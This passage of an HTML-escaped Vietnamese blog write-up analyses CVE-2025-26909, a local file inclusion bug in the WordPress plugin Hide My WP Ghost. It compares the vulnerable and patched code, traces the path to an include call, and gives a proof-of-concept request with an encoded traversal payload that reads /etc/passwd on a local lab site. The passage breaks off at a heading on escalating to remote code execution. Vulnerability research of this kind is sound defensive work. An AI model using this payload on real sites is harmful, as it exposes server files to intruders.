1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Hide My WP Ghost&lt;/strong&gt;: &lt;strong&gt;5.3.02&lt;/strong&gt; (vulnerable) và &lt;strong&gt;5.4.02&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bản lỗi&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getOriginalUrl( $url ) {&#xA;&#xA;    // Build the rewrite rules if they are not already built&#xA;    if ( empty( $this-&amp;gt;_rewrites ) ) {&#xA;        $this-&amp;gt;buildRedirect();&#xA;    }&#xA;&#xA;    // Parse the URL components&#xA;    $parse_url = wp_parse_url( $url );&#xA;&#xA;    // Get the home root path&#xA;    $path = wp_parse_url( home_url(), PHP_URL_PATH );&#xA;&#xA;    // Backslash the paths&#xA;    if ( $path &amp;lt;&amp;gt; &amp;#39;&amp;#39; ) {&#xA;        $parse_url[&amp;#39;path&amp;#39;] = preg_replace( &amp;#39;/^&amp;#39; . preg_quote( $path, &amp;#39;/&amp;#39; ) . &amp;#39;/&amp;#39;, &amp;#39;&amp;#39;, $parse_url[&amp;#39;path&amp;#39;] );&#xA;    }&#xA;&#xA;    // Replace paths to original based on rewrite rules&#xA;    if ( isset( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;] ) &amp;amp;&amp;amp; isset( $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;] ) ) {&#xA;        $parse_url[&amp;#39;path&amp;#39;] = preg_replace( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;], $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;], $parse_url[&amp;#39;path&amp;#39;], 1 );&#xA;    }&#xA;&#xA;    // Default to https if the scheme is not set&#xA;    if ( ! isset( $parse_url[&amp;#39;scheme&amp;#39;] ) ) {&#xA;        $parse_url[&amp;#39;scheme&amp;#39;] = &amp;#39;https&amp;#39;;&#xA;    }&#xA;&#xA;    // Reconstruct the URL&#xA;    if ( isset( $parse_url[&amp;#39;port&amp;#39;] ) &amp;amp;&amp;amp; $parse_url[&amp;#39;port&amp;#39;] &amp;lt;&amp;gt; 80 ) {&#xA;        $new_url = $parse_url[&amp;#39;scheme&amp;#39;] . &amp;#39;://&amp;#39; . $parse_url[&amp;#39;host&amp;#39;] . &amp;#39;:&amp;#39; . $parse_url[&amp;#39;port&amp;#39;] . $path . $parse_url[&amp;#39;path&amp;#39;];&#xA;    } else {&#xA;        $new_url = $parse_url[&amp;#39;scheme&amp;#39;] . &amp;#39;://&amp;#39; . $parse_url[&amp;#39;host&amp;#39;] . $path . $parse_url[&amp;#39;path&amp;#39;];&#xA;    }&#xA;&#xA;    // Append query string if present&#xA;    if ( isset( $parse_url[&amp;#39;query&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $parse_url[&amp;#39;query&amp;#39;] ) ) {&#xA;        $query   = $parse_url[&amp;#39;query&amp;#39;];&#xA;        $query   = str_replace( array( &amp;#39;?&amp;#39;, &amp;#39;%3F&amp;#39; ), &amp;#39;&amp;amp;&amp;#39;, $query );&#xA;        $new_url .= ( ! strpos( $new_url, &amp;#39;?&amp;#39; ) ? &amp;#39;?&amp;#39; : &amp;#39;&amp;amp;&amp;#39; ) . $query;&#xA;    }&#xA;&#xA;    // Return the constructed URL&#xA;    return $new_url;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;getOriginalUrl()&lt;/code&gt; dùng để phân tích và tái tạo lại URL gốc dựa trên các quy tắc rewrite trong hệ thống.&lt;/p&gt;&#xA;&lt;p&gt;Trong phiên bản lỗi, giá trị &lt;code&gt;$new_url&lt;/code&gt; không được làm sạch trước khi trả về, cho phép kẻ tấn công chèn đường dẫn độc hại như &lt;code&gt;../../etc/passwd&lt;/code&gt; dẫn đến nguy cơ &lt;strong&gt;LFI&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getOriginalUrl( $url ) {&#xA;&#xA;    // Build the rewrite rules if they are not already built&#xA;    if ( empty( $this-&amp;gt;_rewrites ) ) {&#xA;        $this-&amp;gt;buildRedirect();&#xA;    }&#xA;&#xA;    // Parse the URL components&#xA;    $parse_url = wp_parse_url( $url );&#xA;&#xA;    // Only if there is a path to change&#xA;    if( !isset( $parse_url[&amp;#39;path&amp;#39;] ) ) {&#xA;        return $url;&#xA;    }&#xA;&#xA;    // Get the home root path&#xA;    $path = wp_parse_url( home_url(), PHP_URL_PATH );&#xA;&#xA;    // Backslash the paths&#xA;    if ( $path &amp;lt;&amp;gt; &amp;#39;&amp;#39; ) {&#xA;        $parse_url[&amp;#39;path&amp;#39;] = preg_replace( &amp;#39;/^&amp;#39; . preg_quote( $path, &amp;#39;/&amp;#39; ) . &amp;#39;/&amp;#39;, &amp;#39;&amp;#39;, $parse_url[&amp;#39;path&amp;#39;] );&#xA;    }&#xA;&#xA;    // Replace paths to original based on rewrite rules&#xA;    if ( isset( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;] ) &amp;amp;&amp;amp; isset( $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;] ) ) {&#xA;        $parse_url[&amp;#39;path&amp;#39;] = preg_replace( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;], $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;], $parse_url[&amp;#39;path&amp;#39;], 1 );&#xA;    }&#xA;&#xA;    // Default to https if the scheme is not set&#xA;    if ( ! isset( $parse_url[&amp;#39;scheme&amp;#39;] ) ) {&#xA;        $parse_url[&amp;#39;scheme&amp;#39;] = &amp;#39;https&amp;#39;;&#xA;    }&#xA;&#xA;    // Reconstruct the URL&#xA;    if ( isset( $parse_url[&amp;#39;port&amp;#39;] ) &amp;amp;&amp;amp; $parse_url[&amp;#39;port&amp;#39;] &amp;lt;&amp;gt; 80 ) {&#xA;        $new_url = $parse_url[&amp;#39;scheme&amp;#39;] . &amp;#39;://&amp;#39; . $parse_url[&amp;#39;host&amp;#39;] . &amp;#39;:&amp;#39; . $parse_url[&amp;#39;port&amp;#39;] . $path . $parse_url[&amp;#39;path&amp;#39;];&#xA;    } else {&#xA;        $new_url = $parse_url[&amp;#39;scheme&amp;#39;] . &amp;#39;://&amp;#39; . $parse_url[&amp;#39;host&amp;#39;] . $path . $parse_url[&amp;#39;path&amp;#39;];&#xA;    }&#xA;&#xA;    // Append query string if present&#xA;    if ( isset( $parse_url[&amp;#39;query&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $parse_url[&amp;#39;query&amp;#39;] ) ) {&#xA;        $query   = $parse_url[&amp;#39;query&amp;#39;];&#xA;        $query   = str_replace( array( &amp;#39;?&amp;#39;, &amp;#39;%3F&amp;#39; ), &amp;#39;&amp;amp;&amp;#39;, $query );&#xA;        $new_url .= ( ! strpos( $new_url, &amp;#39;?&amp;#39; ) ? &amp;#39;?&amp;#39; : &amp;#39;&amp;amp;&amp;#39; ) . $query;&#xA;    }&#xA;&#xA;    // Return the constructed URL&#xA;    return sanitize_url( $new_url );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá gọi &lt;code&gt;sanitize_url($new_url)&lt;/code&gt; trước khi trả về, giúp loại bỏ đường dẫn hoặc scheme nguy hiểm, từ đó ngăn chặn khả năng &lt;strong&gt;LFI&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;getOriginalUrl()&lt;/code&gt; được gọi trong hàm &lt;code&gt;showFile()&lt;/code&gt;, gán giá trị trả về cho &lt;code&gt;$new_url&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function showFile( $url ) {&#xA;    // other logic&#xA;    $new_url          = $this-&amp;gt;getOriginalUrl( $url );&#xA;    $new_url_no_query = ( ( strpos( $new_url, &amp;#39;?&amp;#39; ) !== false ) ? substr( $new_url, 0, strpos( $new_url, &amp;#39;?&amp;#39; ) ) : $new_url );&#xA;    $new_path         = $this-&amp;gt;getOriginalPath( $new_url );&#xA;    $ctype            = false;&#xA;&#xA;    if ( $ext = $this-&amp;gt;isFile( $new_url ) ) {&#xA;        // other logic&#xA;    } elseif ( strpos( trailingslashit( $new_url_no_query ), &amp;#39;/&amp;#39; . HMWP_Classes_Tools::getOption( &amp;#39;hmwp_login_url&amp;#39; ) . &amp;#39;/&amp;#39; ) || strpos( trailingslashit( $new_url_no_query ), &amp;#39;/&amp;#39; . HMWP_Classes_Tools::getDefault( &amp;#39;hmwp_login_url&amp;#39; ) . &amp;#39;/&amp;#39; ) ) {&#xA;        // other logic&#xA;    } elseif ( $url &amp;lt;&amp;gt; $new_url ) {&#xA;        if ( stripos( trailingslashit( $new_url_no_query ), &amp;#39;/&amp;#39; . HMWP_Classes_Tools::getDefault( &amp;#39;hmwp_wp-json&amp;#39; ) . &amp;#39;/&amp;#39; ) !== false ) {&#xA;            // other logic&#xA;        } elseif ( strpos( trailingslashit( $new_url_no_query ), &amp;#39;/&amp;#39; . HMWP_Classes_Tools::getDefault( &amp;#39;hmwp_activate_url&amp;#39; ) . &amp;#39;/&amp;#39; ) !== false || strpos( trailingslashit( $new_url_no_query ), &amp;#39;/&amp;#39; . HMWP_Classes_Tools::getDefault( &amp;#39;hmwp_wp-signup_url&amp;#39; ) . &amp;#39;/&amp;#39; ) !== false ) {&#xA;            ob_start();&#xA;            include $new_path;&#xA;            $content = ob_get_clean();&#xA;            header( &amp;#34;HTTP/1.1 200 OK&amp;#34; );&#xA;            //Echo the html file content&#xA;            echo $content;&#xA;            exit();&#xA;        } elseif ( ! HMWP_Classes_Tools::getValue( &amp;#39;nordt&amp;#39; ) ) {&#xA;            // other logic&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;include $new_path&lt;/code&gt; là điểm có thể gây LFI; để thực thi được, các điều kiện bao quanh phải được thỏa mãn.&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;$url&lt;/code&gt; khác &lt;code&gt;$new_url&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Trong &lt;code&gt;getOriginalUrl()&lt;/code&gt; đoạn xử lý query:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( isset( $parse_url[&amp;#39;query&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $parse_url[&amp;#39;query&amp;#39;] ) ) {&#xA;    $query   = $parse_url[&amp;#39;query&amp;#39;];&#xA;    $query   = str_replace( array( &amp;#39;?&amp;#39;, &amp;#39;%3F&amp;#39; ), &amp;#39;&amp;amp;&amp;#39;, $query );&#xA;    $new_url .= ( ! strpos( $new_url, &amp;#39;?&amp;#39; ) ? &amp;#39;?&amp;#39; : &amp;#39;&amp;amp;&amp;#39; ) . $query;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_parse_url( &#39;http://localhost/x/abc?&#39; )&lt;/code&gt; -&amp;gt; có &lt;code&gt;path&lt;/code&gt; nhưng &lt;code&gt;query&lt;/code&gt; rỗng (hoặc &lt;code&gt;query&lt;/code&gt; không được set / empty).&lt;/li&gt;&#xA;&lt;li&gt;Điều kiện &lt;code&gt;isset(...) &amp;amp;&amp;amp; ! empty(...)&lt;/code&gt; sẽ &lt;strong&gt;fail&lt;/strong&gt; với &lt;code&gt;?&lt;/code&gt; không có param, nên không append gì vào &lt;code&gt;$new_url&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$new_url&lt;/code&gt; trả về &lt;code&gt;http://localhost/x/abc&lt;/code&gt; (không có &lt;code&gt;?&lt;/code&gt;), trong khi &lt;code&gt;$url&lt;/code&gt; ban đầu là &lt;code&gt;http://localhost/x/abc?&lt;/code&gt; do đó khác nhau và (&lt;code&gt;$url &amp;lt;&amp;gt; $new_url&lt;/code&gt;) là &lt;code&gt;true&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Biến &lt;code&gt;$new_url_no_query&lt;/code&gt; phải chứa chuỗi &lt;code&gt;&#39;/&#39; . HMWP_Classes_Tools::getDefault(&#39;hmwp_activate_url&#39;) . &#39;/&#39;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Khi tìm trong mã nguồn plugin với từ khóa &lt;code&gt;hmwp_activate_url&lt;/code&gt;, ta thấy hàm &lt;code&gt;HMWP_Classes_Tools::getDefault(&#39;hmwp_activate_url&#39;)&lt;/code&gt; trả về giá trị &lt;strong&gt;&lt;code&gt;wp-activate.php&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/search1.png&#34;&#xA;    alt=&#34;Kết quả trả về của HMWP_Classes_Tools::getDefault( &amp;#39;hmwp_activate_url&amp;#39; )&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả trả về của &lt;code&gt;HMWP_Classes_Tools::getDefault( &#39;hmwp_activate_url&#39; )&lt;/code&gt;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Do đó, điều kiện thực tế là &lt;code&gt;$new_url_no_query&lt;/code&gt; phải chứa &lt;strong&gt;&lt;code&gt;/wp-activate.php/&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;👉 Như vậy, để đoạn &lt;code&gt;include $new_path&lt;/code&gt; được thực thi, URL phải có &lt;strong&gt;ký tự &lt;code&gt;?&lt;/code&gt; ở cuối&lt;/strong&gt; (để &lt;code&gt;$url &amp;lt;&amp;gt; $new_url&lt;/code&gt;) và &lt;strong&gt;chứa &lt;code&gt;/wp-activate.php/&lt;/code&gt;&lt;/strong&gt; trong đường dẫn.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$new_path&lt;/code&gt; là giá trị trả về của &lt;code&gt;getOriginalPath($new_url)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getOriginalPath( $new_url ) {&#xA;    // Remove domain from path&#xA;    $new_path = str_replace( home_url(), &amp;#39;&amp;#39;, $new_url );&#xA;&#xA;    // Remove queries from path&#xA;    if ( strpos( $new_path, &amp;#39;?&amp;#39; ) !== false ) {&#xA;        $new_path = substr( $new_path, 0, strpos( $new_path, &amp;#39;?&amp;#39; ) );&#xA;    }&#xA;&#xA;    return HMWP_Classes_Tools::getRootPath() . ltrim( $new_path, &amp;#39;/&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này trả về path gốc không chứa params string, ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#34;http://localhost/x/wp-activate.php?&amp;#34; -&amp;gt; &amp;#34;/srv/www/wordpress/x/wp-activate.php&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Như vậy ta đã có các điều kiện cần thiết để LFI xảy ra, ta cần tìm luồng gọi đến &lt;code&gt;showFile()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function maybeShowNotFound() {&#xA;    //If the file doesn&amp;#39;t exist&#xA;    //show the file content&#xA;    if ( is_404() ) {&#xA;        $this-&amp;gt;showFile( $this-&amp;gt;getCurrentURL() );&#xA;    } else {&#xA;        $this-&amp;gt;maybeShowLogin( $this-&amp;gt;getCurrentURL() );&#xA;    }&#xA;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;showFile()&lt;/code&gt; được &lt;code&gt;maybeShowNotFound&lt;/code&gt; nếu client request đến tài nguyên không tồn tại với tham số là kết quả trả về của &lt;code&gt;getCurrentURL()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getCurrentURL() {&#xA;    $url = &amp;#39;&amp;#39;;&#xA;&#xA;    if ( isset( $_SERVER[&amp;#39;HTTP_HOST&amp;#39;] ) ) {&#xA;        // build the URL in the address bar&#xA;        $url = is_ssl() ? &amp;#39;https://&amp;#39; : &amp;#39;http://&amp;#39;;&#xA;        $url .= $_SERVER[&amp;#39;HTTP_HOST&amp;#39;];&#xA;        $url .= rawurldecode( $_SERVER[&amp;#39;REQUEST_URI&amp;#39;] );&#xA;    }&#xA;&#xA;    return $url;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;URI&lt;/code&gt; lấy từ &lt;code&gt;$_SERVER[&#39;REQUEST_URI&#39;]&lt;/code&gt; được decode rồi concat vào &lt;code&gt;$url&lt;/code&gt; để trả về.&lt;/p&gt;&#xA;&lt;p&gt;Ta đặt debug trong hàm &lt;code&gt;showFile()&lt;/code&gt; và gửi request đến tài nguyên không tồn tại.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /x/wp-activate.php? HTTP/1.1&#xA;Host: localhost&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Debugger đã nhảy đến &lt;code&gt;showFile()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/debug1.png&#34;&#xA;    alt=&#34;Debugger nhảy đến showFile()&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debugger nhảy đến &lt;code&gt;showFile()&lt;/code&gt;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Gửi request với LFI payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd? HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Connection: keep-alive&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: none&#xA;Sec-Fetch-User: ?1&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0, i&#xA;Content-Length: 0&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Debug&lt;/strong&gt;:&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/debug2.png&#34;&#xA;    alt=&#34;Debugger với valid payload&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debugger với valid payload&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/result1.png&#34;&#xA;    alt=&#34;Kết quả LFI thành công&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả LFI thành công&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;strong&gt;Giải thích&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;/x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd?&lt;/code&gt; sau khi decode sẽ trở thành &lt;code&gt;/x/wp-activate.php/..///..///..///..///../etc/passwd?&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta dùng chuỗi này để đánh lừa Apache, khiến Apache không phát hiện việc vượt &lt;strong&gt;Document Root&lt;/strong&gt;. Nếu dùng &lt;code&gt;/x/wp-activate.php/../../../../../etc/passwd?&lt;/code&gt; sẽ bị phát hiện vượt &lt;strong&gt;Document Root&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;///&lt;/code&gt; vẫn được chấp nhận tương đương &lt;code&gt;/&lt;/code&gt;, ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;w41bu1@22NS088:~$ ls /////////&#xA;bin  boot  cdrom  dev  etc  home  lib  lib64  lost&amp;#43;found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  swap.img&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;log-poisoning--lfi--rce&#34;&gt;&lt;span&gt;Log poisoning → LFI → RCE&lt;/span&gt;&#xA;  &lt;a href=&#34;#log-poisoning--lfi--rce&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; 